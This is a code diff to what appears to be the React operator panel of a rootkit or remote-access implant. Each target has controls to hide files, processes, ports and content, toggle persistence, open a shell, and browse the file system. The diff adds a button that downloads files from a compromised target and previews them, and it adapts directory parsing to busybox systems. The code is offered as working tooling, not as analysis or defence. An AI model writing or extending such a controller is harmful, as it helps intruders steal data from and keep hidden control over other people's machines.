@@ -2,7 +2,7 @@ import { useState, useRef, useEffect, useCallback } from 'react'
 import {
   ArrowLeft, RefreshCw, Search, Shield, Network,
   SquareTerminal, Folder, FileText, ChevronRight,
-  Eye, EyeOff, Loader, Clock, Activity, Radio, Zap,
+  Eye, EyeOff, Loader, Clock, Activity, Radio, Zap, Download,
 } from 'lucide-react'
 import { Badge, StatusPill } from '../components/Badge'
 import { CmdBar } from '../components/CmdBar'
@@ -36,7 +36,7 @@ const TABS = [
   { key: 'events', label: 'Events' },
 ]
 
-export function Target({ target: t, log, events, sendCmd, query, execCmd, onBack }) {
+export function Target({ target: t, log, events, sendCmd, query, execCmd, downloadFile, onBack }) {
   const [tab, setTab] = useState('overview')
 
   if (!t) return (
@@ -106,7 +106,7 @@ export function Target({ target: t, log, events, sendCmd, query, execCmd, onBack
       {/* Content */}
       <div className="flex-1 overflow-auto min-h-0">
         {tab === 'overview' && <OverviewTab target={t} cmd={cmd} query={query} />}
-        {tab === 'files' && <FilesTab target={t} cmd={cmd} query={query} execCmd={execCmd} />}
+        {tab === 'files' && <FilesTab target={t} cmd={cmd} query={query} execCmd={execCmd} downloadFile={downloadFile} />}
         {tab === 'procs' && <ProcsTab target={t} cmd={cmd} query={query} execCmd={execCmd} />}
         {tab === 'ports' && <PortsTab target={t} cmd={cmd} execCmd={execCmd} />}
         {tab === 'shell' && <ShellTab target={t} />}
@@ -131,10 +131,10 @@ function OverviewTab({ target: t, cmd, query }) {
   }
   const total = hidden.file + hidden.pid + hidden.port + hidden.content
 
-  const doPersist = useCallback(() => {
+  const togglePersist = useCallback(() => {
     setPersistPending(true)
-    query('PERSIST', t.id).then(() => setPersistPending(false))
-  }, [query, t.id])
+    query(t.persisted ? 'UNPERSIST' : 'PERSIST', t.id).then(() => setPersistPending(false))
+  }, [query, t.id, t.persisted])
 
   return (
     <div className="grid grid-cols-1 lg:grid-cols-3 gap-0 h-full">
@@ -169,15 +169,13 @@ function OverviewTab({ target: t, cmd, query }) {
                 {t.persisted ? 'active' : 'off'}
               </span>
               {persistPending && <Loader size={12} className="animate-spin text-fg-3" />}
-              {!t.persisted && (
-                <button
-                  className="nb-btn px-3 py-1.5 text-sm flex items-center gap-1.5"
-                  onClick={doPersist}
-                  disabled={!t.online || persistPending}
-                >
-                  <Shield size={12} /> Persist
-                </button>
-              )}
+              <button
+                className={`nb-btn px-3 py-1.5 text-sm flex items-center gap-1.5 ${t.persisted ? 'bg-green text-white' : ''}`}
+                onClick={togglePersist}
+                disabled={!t.online || persistPending}
+              >
+                <Shield size={12} /> {t.persisted ? 'Unpersist' : 'Persist'}
+              </button>
             </div>
           </div>
         </Section>
@@ -289,21 +287,56 @@ function parseShellLs(output) {
   if (!output) return []
   return output.split('\n').filter(line => line && !line.startsWith('total ')).map(line => {
     const parts = line.split(/\s+/)
-    if (parts.length < 9) return null
+    if (parts.length < 6) return null
     const perms = parts[0]
+    if (!/^[dlcbsp-]/.test(perms)) return null
     const size = parseInt(parts[4], 10) || 0
-    const name = parts.slice(8).join(' ')
-    if (name === '.' || name === '..') return null
+    // busybox ls -la may have fewer columns than coreutils
+    const nameIdx = parts.findIndex((p, i) => i >= 5 && /^\d{1,2}:\d{2}$/.test(p))
+    const name = (nameIdx >= 0 ? parts.slice(nameIdx + 1) : parts.slice(8)).join(' ').trim()
+    if (!name || name === '.' || name === '..') return null
     return { name, type: perms[0] === 'd' ? 'd' : perms[0] === 'l' ? 'l' : 'f', size, perms }
   }).filter(Boolean)
 }
 
-function FilesTab({ target: t, cmd, query, execCmd }) {
+function FilesTab({ target: t, cmd, query, execCmd, downloadFile }) {
   const [cwd, setCwd] = useState('/')
   const [pathInput, setPathInput] = useState('/')
   const [pathError, setPathError] = useState(false)
   const [selected, setSelected] = useState(null)
   const [panel, setPanel] = useState('explorer')
+  const [dlStatus, setDlStatus] = useState({})
+  const [preview, setPreview] = useState(null)
+
+  const doDownload = useCallback((path) => {
+    if (!downloadFile) return
+    setDlStatus(s => ({ ...s, [path]: { state: 'pending', received: 0, total: 0 } }))
+    const onProgress = (received, total) => {
+      setDlStatus(s => ({ ...s, [path]: { state: 'pending', received, total } }))
+    }
+    downloadFile(path, t.id, onProgress).then(r => {
+      if (r.ok) {
+        setDlStatus(s => ({ ...s, [path]: { state: 'done' } }))
+        const raw = Uint8Array.from(atob(r.data), c => c.charCodeAt(0))
+        const blob = new Blob([raw])
+        const url = URL.createObjectURL(blob)
+        const a = document.createElement('a')
+        a.href = url
+        a.download = path.split('/').pop() || 'download'
+        a.click()
+        URL.revokeObjectURL(url)
+        try {
+          const text = new TextDecoder('utf-8', { fatal: true }).decode(raw)
+          setPreview({ path, content: text, size: r.size })
+        } catch {
+          setPreview({ path, content: '(binary file)', size: r.size })
+        }
+      } else {
+        setDlStatus(s => ({ ...s, [path]: { state: 'error' } }))
+      }
+      setTimeout(() => setDlStatus(s => { const n = { ...s }; delete n[path]; return n }), 3000)
+    })
+  }, [downloadFile, t.id])
   const snap = useSnapshot(`files:${t.id}:${cwd}`)
   const hiddenFiles = t.hidden?.file || []
   const hiddenContent = t.hidden?.content || []
@@ -429,6 +462,25 @@ function FilesTab({ target: t, cmd, query, execCmd }) {
                     {isDir ? '-' : formatSize(entry.size)}
                   </span>
                   <div className="flex items-center justify-end gap-1 self-center">
+                    {!isDir && (() => {
+                      const dl = dlStatus[fullPath]
+                      const pending = dl?.state === 'pending'
+                      const pct = pending && dl.total ? Math.round(dl.received * 100 / dl.total) : 0
+                      return (
+                        <button
+                          className={`p-1 transition-opacity ${pending ? 'text-main opacity-100' : 'text-fg-3 hover:text-main opacity-0 group-hover:opacity-100'}`}
+                          title={pending && dl.total ? `${pct}%` : 'Download'}
+                          onClick={e => { e.stopPropagation(); doDownload(fullPath) }}
+                          disabled={pending}
+                        >
+                          {pending
+                            ? (dl.total
+                              ? <span className="text-[10px] font-mono font-bold tabular-nums">{pct}%</span>
+                              : <Loader size={14} className="animate-spin" />)
+                            : <Download size={14} />}
+                        </button>
+                      )
+                    })()}
                     <button
                       className={`p-1 transition-opacity ${h ? 'text-green opacity-100' : 'text-fg-3 hover:text-red opacity-0 group-hover:opacity-100'}`}
                       title={h ? 'Unhide' : 'Hide'}
@@ -471,6 +523,25 @@ function FilesTab({ target: t, cmd, query, execCmd }) {
             onRemove={i => cmd(`UNHIDE FILE ${i}`)} onAdd={v => cmd(`HIDE FILE ${v}`)} placeholder="/etc/secret.conf" />
           <HiddenSummary title="Hidden Content" icon={Search} items={hiddenContent}
             onRemove={i => cmd(`UNHIDE CONTENT ${i}`)} onAdd={v => cmd(`HIDE CONTENT ${v}`)} placeholder="rootkit" />
+        </div>
+      )}
+
+      {preview && (
+        <div className="absolute inset-0 bg-black/50 flex items-center justify-center z-50 p-4" onClick={() => setPreview(null)}>
+          <div className="bg-bg border-2 border-border rounded-[var(--radius)] shadow-lg w-full max-w-2xl max-h-[80vh] flex flex-col" onClick={e => e.stopPropagation()}>
+            <div className="flex items-center justify-between px-4 py-3 border-b-2 border-border bg-secondary">
+              <div className="flex items-center gap-2 min-w-0">
+                <Download size={14} className="text-main shrink-0" />
+                <span className="font-mono text-sm font-bold truncate">{preview.path}</span>
+              </div>
+              <div className="flex items-center gap-3 shrink-0">
+                <span className="text-xs text-fg-3">{preview.size} bytes</span>
+                <button className="nb-btn px-2 py-1 text-xs" onClick={() => setPreview(null)}>Close</button>
+              </div>
+
+            </div>
+            <pre className="flex-1 overflow-auto p-4 text-xs font-mono whitespace-pre-wrap break-all">{preview.content}</pre>
+          </div>
         </div>
       )}
     </div>
